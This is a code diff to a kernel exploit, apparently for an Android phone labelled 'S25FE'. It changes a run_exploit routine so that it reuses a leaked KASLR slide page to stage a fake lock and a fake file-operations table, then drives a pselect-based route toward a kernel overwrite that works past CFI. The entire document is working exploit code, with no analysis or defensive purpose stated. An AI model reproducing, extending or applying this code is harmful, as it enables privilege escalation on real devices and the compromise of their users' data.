@@ -449,12 +449,18 @@ int run_exploit(int argc, char **argv) {
   pipebuf_page_base = page_base ? page_base : 0xffffff8000000000ULL;
   pr_info("app fops stage: skipping P0 pipe preparation\n");
 #endif
-  reset_pipe_attempt();
+  /* S25FE: reuse slide leak page; skip prepare_good_kernel_page() */
+  if (page_base) {
+    fake_lock = page_base + FAKE_LOCK_OFF;
+    fake_fops = page_base + FOPS_OFF;
+    pr_info("S25FE: reusing slide page base=%016zx lock=%016zx fops=%016zx\n",
+            page_base, fake_lock, fake_fops);
+  } else {
+    pr_error("S25FE: no slide page to reuse\n");
+    return 1;
+  }
+
   pin_to_core(CORE);
-#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
-    !APP_FOPS_REUSE_VERIFIED_PAGE
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-#endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
@@ -511,10 +517,10 @@ int run_exploit(int argc, char **argv) {
         continue;
       }
     }
-        /* S25FE: bypass pselect route and its P0 preparation; direct overwrite */
-    atomic_store(&cfi_stage_done, 0);
-    do_pselect_fake_lock_route();
-    int verified = atomic_load(&cfi_stage_done);
+  /* S25FE: use original pselect route; configfs can't access .data */
+  fake_fops = page_base + FOPS_OFF;
+  do_pselect_fake_lock_route();
+  int verified = atomic_load(&cfi_stage_done);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     pr_info("app fops direct route attempt=%d verified=%d\n",
             attempt, verified);
